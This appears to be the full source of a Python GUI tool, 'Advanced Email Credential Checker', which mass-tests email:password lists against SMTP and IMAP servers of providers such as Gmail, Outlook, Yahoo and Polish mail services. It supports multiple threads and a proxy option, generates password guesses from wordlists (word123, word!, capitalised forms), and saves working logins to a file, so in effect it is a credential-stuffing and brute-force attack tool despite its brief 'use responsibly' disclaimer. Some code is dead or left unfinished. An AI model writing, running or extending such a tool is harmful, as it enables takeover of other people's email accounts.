import sys
import os
import smtplib
import ssl
import time
import socket
import random
import threading
import queue
import imaplib
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
from tkinter.font import Font
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from tkinter.font import Font
import urllib.request
import winreg

class ProxyManager:
    def __init__(self):
        self.system_proxy = None
        self.update_system_proxy()
    
    def update_system_proxy(self):
        """Get Windows system proxy settings"""
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                                   0, winreg.KEY_READ)
            proxy_enable = winreg.QueryValueEx(reg_key, "ProxyEnable")[0]
            if proxy_enable:
                proxy_server = winreg.QueryValueEx(reg_key, "ProxyServer")[0]
                self.system_proxy = proxy_server
            else:
                self.system_proxy = None
            winreg.CloseKey(reg_key)
        except Exception:
            self.system_proxy = None

    def get_current_ip(self):
        """Get current IP address to verify proxy"""
        try:
            # Use a service that returns the IP address
            response = urllib.request.urlopen('https://api.ipify.org')
            return response.read().decode('utf-8')
        except Exception as e:
            return f"Error getting IP: {str(e)}"

    def get_proxy_info(self):
        """Return current proxy information"""
        if self.system_proxy:
            return f"System Proxy: {self.system_proxy}"
        return "No system proxy configured"

class UserAgentManager:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        ]
        self.custom_agents = []
        self.use_custom = False
    
    def load_from_file(self, file_path):
        try:
            with open(file_path, 'r') as f:
                self.custom_agents = [line.strip() for line in f if line.strip()]
            self.use_custom = bool(self.custom_agents)
            return len(self.custom_agents)
        except Exception as e:
            return f"Error loading user agents: {str(e)}"
    
    def load_from_text(self, text):
        self.custom_agents = [line.strip() for line in text.split('\n') if line.strip()]
        self.use_custom = bool(self.custom_agents)
        return len(self.custom_agents)
    
    def get_random_user_agent(self):
        if self.use_custom and self.custom_agents:
            return random.choice(self.custom_agents)
        return random.choice(self.user_agents)

class SMTPChecker:
    def __init__(self, callback=None, logger=None):
        self.callback = callback
        self.logger = logger
        self.proxy_manager = ProxyManager()
        self.ua_manager = UserAgentManager()
        self.is_running = False
        self.pause_event = threading.Event()
        self.pause_event.set()  # Not paused initially
        self.stop_event = threading.Event()
        self.queue = queue.Queue()
        self.threads = []
        self.results = {
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'total': 0
        }
        self.valid_credentials = []
        self.error_credentials = []
        
        # Import imaplib here to make it available to all methods
        try:
            import imaplib
            self.imaplib = imaplib
        except ImportError:
            self.log("Warning: imaplib module not available. IMAP support will be limited.")
            self.imaplib = None
    
    def check_credentials(self, email, password, server, port, protocol="smtp", use_ssl=True, use_proxy=False, timeout=10):
        """
        Check if email credentials are valid
        
        Args:
            protocol: "smtp" or "imap"
        """
        user_agent = self.ua_manager.get_random_user_agent()
        
        try:
            # Create a secure context
            context = ssl.create_default_context()
            
            # Apply system proxy if enabled
            if use_proxy and self.proxy_manager.system_proxy:
                proxy_handler = urllib.request.ProxyHandler({
                    'http': f'http://{self.proxy_manager.system_proxy}',
                    'https': f'http://{self.proxy_manager.system_proxy}'
                })
                opener = urllib.request.build_opener(proxy_handler)
                urllib.request.install_opener(opener)
            
            # Log current IP for verification
            current_ip = self.proxy_manager.get_current_ip()
            self.log(f"Current IP: {current_ip}")
            self.log(self.proxy_manager.get_proxy_info())

            if protocol.lower() == "smtp":
                # SMTP authentication
                if use_ssl:
                    server_class = smtplib.SMTP_SSL
                else:
                    server_class = smtplib.SMTP
                
                with server_class(server, port, context=context, timeout=timeout) as smtp_server:
                    if not use_ssl:
                        smtp_server.starttls(context=context)
                    smtp_server.login(email, password)
                    return email, password, "SUCCESS", None
            
            elif protocol.lower() == "imap":
                # IMAP authentication
                # Check if imaplib is available
                if not hasattr(self, 'imaplib') or self.imaplib is None:
                    return email, password, "ERROR", "IMAP support not available"
                
                if use_ssl:
                    imap_server = self.imaplib.IMAP4_SSL(server, port, ssl_context=context)
                else:
                    imap_server = self.imaplib.IMAP4(server, port)
                    if hasattr(imap_server, 'starttls'):
                        imap_server.starttls(ssl_context=context)
                
                imap_server.login(email, password)
                imap_server.logout()
                return email, password, "SUCCESS", None
            
            else:
                return email, password, "ERROR", f"Unknown protocol: {protocol}"
                
        except (smtplib.SMTPAuthenticationError) as e:
            return email, password, "FAILED", "Authentication failed"
        except Exception as e:
            if hasattr(self, 'imaplib') and self.imaplib is not None and protocol.lower() == "imap":
                if isinstance(e, self.imaplib.IMAP4.error) and ("Invalid credentials" in str(e) or "Authentication failed" in str(e)):
                    return email, password, "FAILED", "Authentication failed"
            
            if "Authentication failed" in str(e) or "Invalid credentials" in str(e) or "authentication failed" in str(e).lower():
                return email, password, "FAILED", "Authentication failed"
                
            if "timeout" in str(e).lower():
                return email, password, "ERROR", "Connection timed out"
                
            return email, password, "ERROR", f"{protocol.upper()} error: {str(e)}"
        finally:
            # Reset socket if using proxy
            if use_proxy and self.proxy_manager.system_proxy:
                # Restore default opener
                urllib.request.install_opener(None)
    
    def worker(self, server, port, protocol, use_ssl, use_proxy, timeout, delay):
        """Worker thread that processes credentials from the queue"""
        while not self.stop_event.is_set():
            try:
                # Get a task with timeout to allow checking stop_event periodically
                try:
                    email, password = self.queue.get(timeout=1)
                except queue.Empty:
                    continue
                
                # Check if paused
                self.pause_event.wait()
                
                # Check if stopped
                if self.stop_event.is_set():
                    self.queue.task_done()
                    break
                
                # Check credentials
                result = self.check_credentials(
                    email, password, server, port, 
                    protocol=protocol, use_ssl=use_ssl, 
                    use_proxy=use_proxy, timeout=timeout
                )
                email, password, status, error = result
                
                # Process result
                if status == "SUCCESS":
                    self.results['valid'] += 1
                    self.valid_credentials.append(f"{email}:{password}")
                    self.log(f"[+] VALID: {email}")
                elif status == "FAILED":
                    self.results['invalid'] += 1
                    self.error_credentials.append(f"{email}:{password} - {error}")
                    self.log(f"[-] INVALID: {email}")
                else:
                    self.results['errors'] += 1
                    self.error_credentials.append(f"{email}:{password} - {error}")
                    self.log(f"[!] ERROR: {email} - {error}")
                
                # Update UI
                if self.callback:
                    self.callback(self.results)
                
                # Mark task as done
                self.queue.task_done()
                
                # Add delay if specified
                if delay > 0:
                    time.sleep(delay)
                    
            except Exception as e:
                self.log(f"Worker error: {str(e)}")
    
    def start_checking(self, credentials, server, port, protocol="smtp", threads=5, delay=1, use_ssl=True, use_proxy=False, timeout=10):
        """Start checking email credentials"""
        if self.is_running:
            return False
        
        # Reset state
        self.stop_event.clear()
        self.pause_event.set()
        self.is_running = True
        self.results = {'valid': 0, 'invalid': 0, 'errors': 0, 'total': len(credentials)}
        self.valid_credentials = []
        self.error_credentials = []
        
        # Add credentials to the queue
        for email, password in credentials:
            self.queue.put((email, password))
        
        # Create and start worker threads
        self.threads = []
        for _ in range(min(threads, len(credentials))):
            t = threading.Thread(
                target=self.worker,
                args=(server, port, protocol, use_ssl, use_proxy, timeout, delay)
            )
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        return True
    
    def stop_checking(self):
        """Stop checking process"""
        if not self.is_running:
            return
        
        self.stop_event.set()
        self.pause_event.set()  # Ensure not paused
        
        # Wait for all threads to finish
        for t in self.threads:
            if t.is_alive():
                t.join(1)
        
        # Clear queue
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except queue.Empty:
                break
        
        self.is_running = False
        self.log("Checking stopped")
    
    def pause_checking(self):
        """Pause checking process"""
        if self.is_running and self.pause_event.is_set():
            self.pause_event.clear()
            self.log("Checking paused")
            return True
        return False
    
    def resume_checking(self):
        """Resume checking process"""
        if self.is_running and not self.pause_event.is_set():
            self.pause_event.set()
            self.log("Checking resumed")
            return True
        return False
    
    def log(self, message):
        """Log a message"""
        if self.logger:
            self.logger(message)
        else:
            print(message)
    
    def save_results(self, valid_file, error_file):
        """Save results to files"""
        try:
            with open(valid_file, 'w') as f:
                f.write('\n'.join(self.valid_credentials))
            
            with open(error_file, 'w') as f:
                f.write('\n'.join(self.error_credentials))
            
            return True
        except Exception as e:
            self.log(f"Error saving results: {str(e)}")
            return False

class EmailCheckerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Advanced Email Credential Checker")
        self.root.geometry("950x700")
        self.root.resizable(True, True)
        
        # Set app icon if available
        try:
            self.root.iconbitmap("smtp_icon.ico")
        except:
            pass
        
        # Configure styles
        self.style = ttk.Style()
        self.style.configure("TButton", padding=6, relief="flat")
        self.style.configure("TFrame", background="#f0f0f0")
        self.style.configure("TLabel", background="#f0f0f0")
        self.style.configure("Header.TLabel", font=("Helvetica", 12, "bold"))
        self.style.configure("Success.TLabel", foreground="green")
        self.style.configure("Error.TLabel", foreground="red")
        
        # SMTP Checker instance
        self.checker = SMTPChecker(callback=self.update_stats, logger=self.log_message)
        
        # Create the main UI
        self.create_ui()
    
    def create_ui(self):
        # Create main frame
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create tabs
        self.tab_control = ttk.Notebook(main_frame)
        
        # Main tab
        self.main_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.main_tab, text="SMTP Checker")
        
        # Settings tab
        self.settings_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.settings_tab, text="Settings")
        
        # Proxy tab
        self.proxy_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.proxy_tab, text="Proxy / User Agent")
        
        # About tab
        self.about_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.about_tab, text="About")
        
        self.tab_control.pack(fill=tk.BOTH, expand=True)
        
        # Setup tabs
        self.setup_main_tab()
        self.setup_settings_tab()
        self.setup_proxy_tab()
        self.setup_about_tab()
        
        # Set default protocols
        self.set_default_servers()
    
    def setup_main_tab(self):
        # Create left and right frames for main tab
        left_frame = ttk.Frame(self.main_tab, padding=5)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_frame = ttk.Frame(self.main_tab, padding=5)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Credentials section - left frame
        creds_frame = ttk.LabelFrame(left_frame, text="Credentials", padding=5)
        creds_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Buttons for credentials
        cred_btn_frame = ttk.Frame(creds_frame)
        cred_btn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(cred_btn_frame, text="Import File", command=self.import_credentials_file).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Import Wordlist", command=self.import_wordlist).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Clear", command=lambda: self.credentials_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Copy", command=lambda: self.copy_to_clipboard(self.credentials_text.get(1.0, tk.END))).pack(side=tk.LEFT, padx=2)
        ttk.Button(cred_btn_frame, text="Paste", command=lambda: self.paste_from_clipboard(self.credentials_text)).pack(side=tk.LEFT, padx=2)
        
        # Credentials text area
        self.credentials_text = scrolledtext.ScrolledText(creds_frame, height=15)
        self.credentials_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Control section - left frame
        control_frame = ttk.LabelFrame(left_frame, text="Control", padding=5)
        control_frame.pack(fill=tk.X, pady=5)
        
        # Server settings
        self.server_frame = ttk.Frame(control_frame)
        self.server_frame.pack(fill=tk.X, pady=5)
        
        # Protocol Selection
        ttk.Label(self.server_frame, text="Protocol:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.protocol_var = tk.StringVar(value="smtp")
        protocol_combo = ttk.Combobox(self.server_frame, textvariable=self.protocol_var, width=6, state="readonly")
        protocol_combo['values'] = ('smtp', 'imap')
        protocol_combo.grid(row=0, column=1, padx=5, sticky=tk.W)
        
        # Server label will update based on protocol
        self.server_label = ttk.Label(self.server_frame, text="SMTP Server:")
        self.server_label.grid(row=1, column=0, padx=5, sticky=tk.W)
        
        self.server_var = tk.StringVar(value="poczta.interia.pl")
        ttk.Entry(self.server_frame, textvariable=self.server_var).grid(row=1, column=1, padx=5, sticky=tk.W+tk.E, columnspan=2)
        
        ttk.Label(self.server_frame, text="Port:").grid(row=1, column=3, padx=5, sticky=tk.W)
        self.port_var = tk.IntVar(value=465)
        ttk.Entry(self.server_frame, textvariable=self.port_var, width=6).grid(row=1, column=4, padx=5, sticky=tk.W)
        
        self.ssl_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(self.server_frame, text="Use SSL", variable=self.ssl_var).grid(row=1, column=5, padx=5, sticky=tk.W)
        
        # Update server defaults when protocol changes
        def update_protocol(*args):
            protocol = self.protocol_var.get()
            if protocol == "smtp":
                self.server_label.config(text="SMTP Server:")
                if self.port_var.get() == 143 or self.port_var.get() == 993:  # If currently set to IMAP port
                    self.port_var.set(465)  # Default SMTP SSL port
            else:  # IMAP
                self.server_label.config(text="IMAP Server:")
                if self.port_var.get() == 465 or self.port_var.get() == 587:  # If currently set to SMTP port
                    self.port_var.set(993)  # Default IMAP SSL port
        
        self.protocol_var.trace("w", update_protocol)
        
        # Control buttons
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = ttk.Button(btn_frame, text="Start", command=self.start_checking)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.pause_btn = ttk.Button(btn_frame, text="Pause", command=self.pause_resume_checking, state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="Stop", command=self.stop_checking, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(btn_frame, text="Save Results", command=self.save_results).pack(side=tk.LEFT, padx=5)
        
        # Progress section - right frame
        progress_frame = ttk.LabelFrame(right_frame, text="Progress", padding=5)
        progress_frame.pack(fill=tk.X, pady=5)
        
        # Progress indicators
        stats_frame = ttk.Frame(progress_frame)
        stats_frame.pack(fill=tk.X, pady=5)
        
        # Stats
        ttk.Label(stats_frame, text="Total:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.total_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.total_var).grid(row=0, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Valid:").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.valid_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.valid_var, style="Success.TLabel").grid(row=1, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Invalid:").grid(row=2, column=0, padx=5, sticky=tk.W)
        self.invalid_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.invalid_var, style="Error.TLabel").grid(row=2, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Errors:").grid(row=3, column=0, padx=5, sticky=tk.W)
        self.errors_var = tk.StringVar(value="0")
        ttk.Label(stats_frame, textvariable=self.errors_var).grid(row=3, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(stats_frame, text="Status:").grid(row=4, column=0, padx=5, sticky=tk.W)
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(stats_frame, textvariable=self.status_var).grid(row=4, column=1, padx=5, sticky=tk.W)
        
        # Progress bar
        self.progress_var = tk.DoubleVar(value=0.0)
        self.progress_bar = ttk.Progressbar(progress_frame, orient=tk.HORIZONTAL, length=200, mode='determinate', variable=self.progress_var)
        self.progress_bar.pack(fill=tk.X, pady=5)
        
        # Log section - right frame
        log_frame = ttk.LabelFrame(right_frame, text="Log", padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(log_frame, height=20)
        self.log_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Results section - right frame
        results_frame = ttk.LabelFrame(right_frame, text="Valid Credentials", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Results text area
        self.results_text = scrolledtext.ScrolledText(results_frame, height=10)
        self.results_text.pack(fill=tk.BOTH, expand=True, pady=5)
    
    def setup_settings_tab(self):
        # Create settings frame
        settings_frame = ttk.Frame(self.settings_tab, padding=10)
        settings_frame.pack(fill=tk.BOTH, expand=True)
        
        # Threading settings
        thread_frame = ttk.LabelFrame(settings_frame, text="Threading", padding=5)
        thread_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(thread_frame, text="Threads:").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.threads_var = tk.IntVar(value=5)
        ttk.Spinbox(thread_frame, from_=1, to=50, textvariable=self.threads_var, width=5).grid(row=0, column=1, padx=5, sticky=tk.W)
        
        ttk.Label(thread_frame, text="Delay (seconds):").grid(row=1, column=0, padx=5, sticky=tk.W)
        self.delay_var = tk.DoubleVar(value=1.0)
        ttk.Spinbox(thread_frame, from_=0.0, to=10.0, increment=0.1, textvariable=self.delay_var, width=5).grid(row=1, column=1, padx=5, sticky=tk.W)
        
        # Connection settings
        conn_frame = ttk.LabelFrame(settings_frame, text="Connection", padding=5)
        conn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_frame, text="Timeout (seconds):").grid(row=0, column=0, padx=5, sticky=tk.W)
        self.timeout_var = tk.IntVar(value=10)
        ttk.Spinbox(conn_frame, from_=1, to=60, textvariable=self.timeout_var, width=5).grid(row=0, column=1, padx=5, sticky=tk.W)
        
        # System Proxy settings
        proxy_frame = ttk.LabelFrame(settings_frame, text="System Proxy", padding=5)
        proxy_frame.pack(fill=tk.X, pady=5)
        
        self.use_proxy_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(proxy_frame, text="Use System Proxy", variable=self.use_proxy_var).pack(anchor=tk.W, padx=5)
        ttk.Label(proxy_frame, text="Note: Uses Windows system proxy settings").pack(anchor=tk.W, padx=5)
        
        # Add refresh proxy button
        ttk.Button(proxy_frame, text="Refresh Proxy Settings", 
                  command=lambda: self.refresh_proxy_settings()).pack(pady=5)
        
        # Add proxy info label
        self.proxy_info_var = tk.StringVar(value="")
        ttk.Label(proxy_frame, textvariable=self.proxy_info_var).pack(anchor=tk.W, padx=5)
        
        # Update proxy info
        self.refresh_proxy_settings()
        
        # Save settings button
        ttk.Button(settings_frame, text="Save Settings", command=self.save_settings).pack(pady=10)
    
    def refresh_proxy_settings(self):
        """Refresh proxy settings and update the label"""
        self.checker.proxy_manager.update_system_proxy()
        proxy_info = self.checker.proxy_manager.get_proxy_info()
        self.proxy_info_var.set(proxy_info)
    
    def setup_proxy_tab(self):
        # Remove proxy tab elements
        for widget in self.proxy_tab.winfo_children():
            widget.destroy()
        ttk.Label(self.proxy_tab, text="System Proxy is configured in Windows Settings").pack(padx=10, pady=10)
    
    def setup_about_tab(self):
        # Create about frame
        about_frame = ttk.Frame(self.about_tab, padding=20)
        about_frame.pack(fill=tk.BOTH, expand=True)
        
        # Logo or title
        title_font = Font(family="Helvetica", size=16, weight="bold")
        ttk.Label(about_frame, text="Advanced Email Credential Checker", font=title_font).pack(pady=10)
        
        # Version
        ttk.Label(about_frame, text="Version 2.0").pack()
        
        # Description
        desc_text = """
        This application checks the validity of email credentials using SMTP or IMAP protocols.
        
        Features:
        - Multi-threaded checking
        - Support for both SMTP and IMAP protocols
        - Proxy support with rotation
        - Custom User Agents
        - Auto-detection of server settings
        - Import from file or wordlist with variations
        - Copy/paste functionality
        - Detailed logging
        
        Supported email providers include:
        - Interia (interia.pl, interia.eu, interia.com)
        - Gmail (gmail.com)
        - Outlook/Hotmail (outlook.com, hotmail.com)
        - Yahoo (yahoo.com)
        - AOL (aol.com)
        - Polish providers (wp.pl, o2.pl, onet.pl)
        
        Please use responsibly and only on systems you own or have permission to test.
        """
        
        desc_label = ttk.Label(about_frame, text=desc_text, justify=tk.CENTER, wraplength=500)
        desc_label.pack(pady=20)
        
    def set_default_servers(self):
        """Set default server settings for different protocols"""
        # Map of common email providers to their server settings
        self.server_defaults = {
            "smtp": {
                "interia.pl": {"server": "poczta.interia.pl", "port": 465, "ssl": True},
                "interia.eu": {"server": "poczta.interia.pl", "port": 465, "ssl": True},
                "interia.com": {"server": "poczta.interia.pl", "port": 465, "ssl": True},
                "gmail.com": {"server": "smtp.gmail.com", "port": 465, "ssl": True},
                "outlook.com": {"server": "smtp-mail.outlook.com", "port": 587, "ssl": True},
                "hotmail.com": {"server": "smtp-mail.outlook.com", "port": 587, "ssl": True},
                "yahoo.com": {"server": "smtp.mail.yahoo.com", "port": 465, "ssl": True},
                "aol.com": {"server": "smtp.aol.com", "port": 465, "ssl": True},
                "wp.pl": {"server": "smtp.wp.pl", "port": 465, "ssl": True},
                "o2.pl": {"server": "smtp.o2.pl", "port": 465, "ssl": True},
                "onet.pl": {"server": "smtp.poczta.onet.pl", "port": 465, "ssl": True},
            },
            "imap": {
                "interia.pl": {"server": "poczta.interia.pl", "port": 993, "ssl": True},
                "interia.eu": {"server": "poczta.interia.pl", "port": 993, "ssl": True},
                "interia.com": {"server": "poczta.interia.pl", "port": 993, "ssl": True},
                "gmail.com": {"server": "imap.gmail.com", "port": 993, "ssl": True},
                "outlook.com": {"server": "outlook.office365.com", "port": 993, "ssl": True},
                "hotmail.com": {"server": "outlook.office365.com", "port": 993, "ssl": True},
                "yahoo.com": {"server": "imap.mail.yahoo.com", "port": 993, "ssl": True},
                "aol.com": {"server": "imap.aol.com", "port": 993, "ssl": True},
                "wp.pl": {"server": "imap.wp.pl", "port": 993, "ssl": True},
                "o2.pl": {"server": "imap.o2.pl", "port": 993, "ssl": True},
                "onet.pl": {"server": "imap.poczta.onet.pl", "port": 993, "ssl": True},
            }
        }
        
        # Add autodetect button to server settings
        ttk.Button(self.server_frame, text="Auto-Detect", command=self.auto_detect_server).grid(row=1, column=6, padx=5, sticky=tk.W)
    
    def auto_detect_server(self):
        """Auto-detect server settings based on the first email in the list"""
        cred_text = self.credentials_text.get(1.0, tk.END).strip()
        if not cred_text:
            messagebox.showwarning("Warning", "No credentials to detect from")
            return
        
        # Get the first email address
        for line in cred_text.split('\n'):
            line = line.strip()
            if ':' in line:
                email, _ = line.split(':', 1)
                if '@' in email:
                    domain = email.split('@')[-1].lower()
                    protocol = self.protocol_var.get()
                    
                    # Check if we have default settings for this domain
                    if domain in self.server_defaults[protocol]:
                        settings = self.server_defaults[protocol][domain]
                        self.server_var.set(settings["server"])
                        self.port_var.set(settings["port"])
                        self.ssl_var.set(settings["ssl"])
                        messagebox.showinfo("Auto-Detect", f"Set server settings for {domain}")
                        return
        
        messagebox.showinfo("Auto-Detect", "Could not detect server settings from email domain")
        
        
        # Description
        desc_text = """
        This application checks the validity of SMTP credentials.
        
        Features:
        - Multi-threaded checking
        - Proxy support
        - Custom User Agents
        - Import from file or wordlist
        - Copy/paste functionality
        - Detailed logging
        
        Please use responsibly and only on systems you own or have permission to test.
        """
        
        desc_label = ttk.Label(about_frame, text=desc_text, justify=tk.CENTER, wraplength=400)
        desc_label.pack(pady=20)
    
    def import_wordlist(self):
        """Import wordlist to generate credentials"""
        file_path = filedialog.askopenfilename(
            title="Select Wordlist File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        
        if file_path:
            try:
                # Get email domain
                domain = simpledialog.askstring(
                    "Email Domain", 
                    "Enter email domain (e.g., interia.pl):",
                    initialvalue="interia.pl"
                )
                
                if not domain:
                    return
                
                # Ask if they want to create multiple combinations
                create_variations = messagebox.askyesno(
                    "Create Variations",
                    "Create variations? (e.g., username, username123, etc.)"
                )
                
                # Read wordlist
                with open(file_path, 'r') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
                
                # Generate credentials
                credentials = []
                for word in wordlist:
                    # Basic username@domain
                    email = f"{word}@{domain}"
                    credentials.append(f"{email}:{word}")
                    
                    if create_variations:
                        # Common variations
                        variations = [
                            f"{email}:{word}123",
                            f"{email}:{word}1234",
                            f"{email}:{word}12345",
                            f"{email}:{word}!",
                            f"{email}:{word}@",
                            f"{email}:{word}#",
                            f"{email}:{word}$",
                            f"{email}:{word.capitalize()}",
                            f"{email}:{word.upper()}",
                        ]
                        credentials.extend(variations)
                
                # Update text area
                self.credentials_text.delete(1.0, tk.END)
                self.credentials_text.insert(tk.END, "\n".join(credentials))
                self.log_message(f"Generated {len(credentials)} credentials from wordlist")
                
                # Auto-detect server settings
                self.auto_detect_server()
                
            except Exception as e:
                messagebox.showerror("Wordlist Error", f"Error processing wordlist: {str(e)}")
                
    def import_credentials_file(self):
        """Import credentials from a file"""
        file_path = filedialog.askopenfilename(
            title="Select Credentials File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                
                self.credentials_text.delete(1.0, tk.END)
                self.credentials_text.insert(tk.END, content)
                self.log_message(f"Imported credentials from {file_path}")
                
                # Auto-detect server settings
                self.auto_detect_server()
                
            except Exception as e:
                messagebox.showerror("Import Error", f"Error importing file: {str(e)}")
    
    
    def import_proxy_file(self):
        # Remove proxy file import
        pass
    
    def import_ua_file(self):
        """Import user agents from file"""
        file_path = filedialog.askopenfilename(
            title="Select User Agent File",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                
                self.ua_text.delete(1.0, tk.END)
                self.ua_text.insert(tk.END, content)
                self.log_message(f"Imported user agents from {file_path}")
            except Exception as e:
                messagebox.showerror("Import Error", f"Error importing file: {str(e)}")
    
    def load_default_ua(self):
        """Load default user agents"""
        default_uas = "\n".join(self.checker.ua_manager.user_agents)
        self.ua_text.delete(1.0, tk.END)
        self.ua_text.insert(tk.END, default_uas)
        self.log_message("Loaded default user agents")
    
    def apply_proxy_settings(self):
        # Remove proxy settings application
        pass
    
    def copy_to_clipboard(self, text):
        """Copy text to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.log_message("Copied to clipboard")
    
    def paste_from_clipboard(self, text_widget):
        """Paste text from clipboard"""
        try:
            text = self.root.clipboard_get()
            text_widget.insert(tk.END, text)
            self.log_message("Pasted from clipboard")
        except Exception as e:
            self.log_message(f"Error pasting from clipboard: {str(e)}")
    
    def save_settings(self):
        """Save current settings"""
        # Settings are automatically saved in variables
        self.log_message("Settings saved")
    
    def start_checking(self):
        """Start checking email credentials"""
        # Get credentials
        cred_text = self.credentials_text.get(1.0, tk.END).strip()
        if not cred_text:
            messagebox.showwarning("Warning", "No credentials to check")
            return
        
        # Parse credentials
        credentials = []
        for line in cred_text.split('\n'):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                credentials.append((email, password))
        
        if not credentials:
            messagebox.showwarning("Warning", "No valid credentials found")
            return
        
        # Get settings
        server = self.server_var.get()
        port = self.port_var.get()
        protocol = self.protocol_var.get()
        threads = self.threads_var.get()
        delay = self.delay_var.get()
        use_ssl = self.ssl_var.get()
        use_proxy = self.use_proxy_var.get()
        timeout = self.timeout_var.get()
        
        # Start checking
        if self.checker.start_checking(
            credentials, 
            server, 
            port,
            protocol=protocol,
            threads=threads, 
            delay=delay, 
            use_ssl=use_ssl, 
            use_proxy=use_proxy, 
            timeout=timeout
        ):
            # Update UI
            self.status_var.set("Running")
            self.start_btn.config(state=tk.DISABLED)
            self.pause_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.NORMAL)
            
            # Clear results
            self.results_text.delete(1.0, tk.END)
            
            # Update stats
            self.total_var.set(str(len(credentials)))
            self.valid_var.set("0")
            self.invalid_var.set("0")
            self.errors_var.set("0")
            
            self.log_message(f"Started checking {len(credentials)} credentials")
        else:
            self.log_message("Failed to start checking")
    
    def pause_resume_checking(self):
        """Pause or resume checking"""
        if self.checker.is_running:
            if self.pause_btn["text"] == "Pause":
                # Pause
                if self.checker.pause_checking():
                    self.pause_btn["text"] = "Resume"
                    self.status_var.set("Paused")
            else:
                # Resume
                if self.checker.resume_checking():
                    self.pause_btn["text"] = "Pause"
                    self.status_var.set("Running")
    
    def stop_checking(self):
        """Stop checking process"""
        if self.checker.is_running:
            self.checker.stop_checking()
            
            # Update UI
            self.status_var.set("Stopped")
            self.start_btn.config(state=tk.NORMAL)
            self.pause_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.DISABLED)
            self.pause_btn["text"] = "Pause"
            
            self.log_message("Checking stopped")
    
    def save_results(self):
        """Save checking results to files"""
        if not self.checker.valid_credentials and not self.checker.error_credentials:
            messagebox.showwarning("Warning", "No results to save")
            return
        
        # Ask for directory
        directory = filedialog.askdirectory(title="Select Directory to Save Results")
        if not directory:
            return
        
        # Create file paths
        valid_file = os.path.join(directory, "valid_smtp.txt")
        error_file = os.path.join(directory, "errors.txt")
        
        # Save results
        if self.checker.save_results(valid_file, error_file):
            self.log_message(f"Results saved to {directory}")
            messagebox.showinfo("Success", f"Results saved to {directory}")
        else:
            messagebox.showerror("Error", "Failed to save results")
    
    def update_stats(self, results):
        """Update statistics in UI"""
        self.valid_var.set(str(results['valid']))
        self.invalid_var.set(str(results['invalid']))
